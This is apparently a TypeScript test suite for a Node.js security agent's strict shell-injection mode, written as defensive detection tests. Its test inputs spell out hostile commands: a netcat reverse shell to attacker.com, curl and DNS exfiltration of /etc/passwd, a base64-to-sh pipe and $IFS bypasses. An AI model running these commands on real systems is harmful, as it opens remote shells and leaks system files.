import * as t from "tap";
import { Context, runWithContext } from "../agent/Context";
import { ChildProcess } from "./ChildProcess";
import { createTestAgent } from "../helpers/createTestAgent";

const unsafeContext: Context = {
  remoteAddress: "::1",
  method: "POST",
  url: "http://localhost:4000",
  query: {},
  headers: {},
  body: {
    file: {
      matches: "`echo .`",
    },
  },
  cookies: {},
  routeParams: {},
  source: "express",
  route: "/posts/:id",
};

function throws(fn: () => void, wanted: string | RegExp) {
  const error = t.throws(fn);
  if (error instanceof Error) {
    t.match(error.message, wanted);
  }
}

t.beforeEach(() => {
  delete process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE;
});

t.test("strict mode", async (t) => {
  const agent = createTestAgent({
    serverless: "lambda",
  });

  agent.start([new ChildProcess()]);

  const { exec, execSync, spawn, spawnSync, execFile, execFileSync } =
    require("child_process") as typeof import("child_process");

  // Unsupported shells are blocked even without malicious input

  t.test("rejects /bin/zsh via spawn even without injection", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(unsafeContext, () => {
      throws(
        () => spawn("ls", [], { shell: "/bin/zsh" }).unref(),
        /Zen strict mode: shell "\/bin\/zsh" is not supported/
      );
    });
  });

  t.test("rejects /bin/bash via spawnSync even without injection", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(unsafeContext, () => {
      throws(
        () => spawnSync("ls", [], { shell: "/bin/bash" }),
        /Zen strict mode: shell "\/bin\/bash" is not supported/
      );
    });
  });

  t.test("rejects /bin/zsh via execSync even without injection", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(unsafeContext, () => {
      throws(
        () => execSync("ls", { shell: "/bin/zsh" }),
        /Zen strict mode: shell "\/bin\/zsh" is not supported/
      );
    });
  });

  t.test(
    "rejects /usr/bin/fish via execFile even without injection",
    async () => {
      process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

      runWithContext(unsafeContext, () => {
        throws(
          () =>
            execFile(
              "ls",
              [],
              { shell: "/usr/bin/fish" },
              (err, stdout, stderr) => {}
            ).unref(),
          /Zen strict mode: shell "\/usr\/bin\/fish" is not supported/
        );
      });
    }
  );

  t.test(
    "rejects /bin/bash via execFileSync even without injection",
    async () => {
      process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

      runWithContext(unsafeContext, () => {
        throws(
          () => execFileSync("ls", [], { shell: "/bin/bash" }),
          /Zen strict mode: shell "\/bin\/bash" is not supported/
        );
      });
    }
  );

  // Allowed shells pass through

  t.test("allows shell: true", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(unsafeContext, () => {
      spawn("ls", ["-la"], { shell: true }).unref();
      spawnSync("ls", ["-la"], { shell: true });
    });
  });

  t.test("allows exec without explicit shell option", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(unsafeContext, () => {
      exec("ls", (err, stdout, stderr) => {}).unref();
      execSync("ls");
    });
  });

  // Without strict mode, unsupported shells are allowed

  t.test("does not reject shells when strict mode is off", async () => {
    runWithContext(unsafeContext, () => {
      spawn("ls", ["-la"], { shell: "/bin/bash" }).unref();
      spawnSync("ls", ["-la"], { shell: "/bin/zsh" });
    });
  });

  // CVE-style injection detection via WASM tokenizer

  t.test("detects nslookup semicolon cat /etc/passwd", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(
      { ...unsafeContext, body: { host: "google.com;cat /etc/passwd" } },
      () => {
        throws(
          () =>
            spawn("nslookup google.com;cat /etc/passwd", [], {
              shell: true,
            }).unref(),
          "Zen has blocked a shell injection: child_process.spawn(...) originating from body.host"
        );
      }
    );
  });

  t.test("detects command substitution $(whoami)", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext({ ...unsafeContext, body: { host: "$(whoami)" } }, () => {
      throws(
        () => execSync("nslookup $(whoami)"),
        "Zen has blocked a shell injection: child_process.execSync(...) originating from body.host"
      );
    });
  });

  t.test("detects pipe to reverse shell", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(
      {
        ...unsafeContext,
        body: { host: "google.com|nc attacker.com 4444 -e /bin/sh" },
      },
      () => {
        throws(
          () =>
            spawn(
              "nslookup google.com|nc attacker.com 4444 -e /bin/sh",
              [],
              { shell: true }
            ).unref(),
          "Zen has blocked a shell injection: child_process.spawn(...) originating from body.host"
        );
      }
    );
  });

  t.test("detects $IFS space bypass", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(
      { ...unsafeContext, body: { path: "${IFS}/etc/passwd" } },
      () => {
        throws(
          () => execSync("cat${IFS}/etc/passwd"),
          "Zen has blocked a shell injection: child_process.execSync(...) originating from body.path"
        );
      }
    );
  });

  t.test("detects base64 decode pipe to sh", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(
      {
        ...unsafeContext,
        body: { payload: "Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh" },
      },
      () => {
        throws(
          () => execSync("echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh"),
          "Zen has blocked a shell injection: child_process.execSync(...) originating from body.payload"
        );
      }
    );
  });

  t.test("detects DNS exfiltration via subdomain", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(
      {
        ...unsafeContext,
        body: {
          host: "$(cat /etc/passwd | base64 | head -c 60).attacker.com",
        },
      },
      () => {
        throws(
          () =>
            execSync(
              "nslookup $(cat /etc/passwd | base64 | head -c 60).attacker.com"
            ),
          "Zen has blocked a shell injection: child_process.execSync(...) originating from body.host"
        );
      }
    );
  });

  t.test("detects curl data exfiltration", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(
      {
        ...unsafeContext,
        body: { url: "http://attacker.com/exfil -d @/etc/passwd" },
      },
      () => {
        throws(
          () => execSync("curl http://attacker.com/exfil -d @/etc/passwd"),
          "Zen has blocked a shell injection: child_process.execSync(...) originating from body.url"
        );
      }
    );
  });

  // Safe patterns should not trigger

  t.test("safe: single-quoted user input", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(
      { ...unsafeContext, body: { host: "example.com" } },
      () => {
        execSync("nslookup 'example.com'");
      }
    );
  });

  t.test("safe: plain hostname", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(
      { ...unsafeContext, body: { host: "example.com" } },
      () => {
        execSync("nslookup example.com");
      }
    );
  });

  t.test("safe: plain IP address", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(
      { ...unsafeContext, body: { ip: "192.168.1.1" } },
      () => {
        execSync("ping -c 4 192.168.1.1");
      }
    );
  });

  // Failed to tokenize — blocked in strict mode

  t.test("blocks command with unclosed quote (failed to tokenize)", async () => {
    process.env.AIKIDO_SHELL_INJECTION_STRICT_MODE = "true";

    runWithContext(
      { ...unsafeContext, body: { input: "unclosed" } },
      () => {
        throws(
          () => execSync("echo 'unclosed"),
          "Zen has blocked a shell injection: child_process.execSync(...) originating from body.input"
        );
      }
    );
  });
});
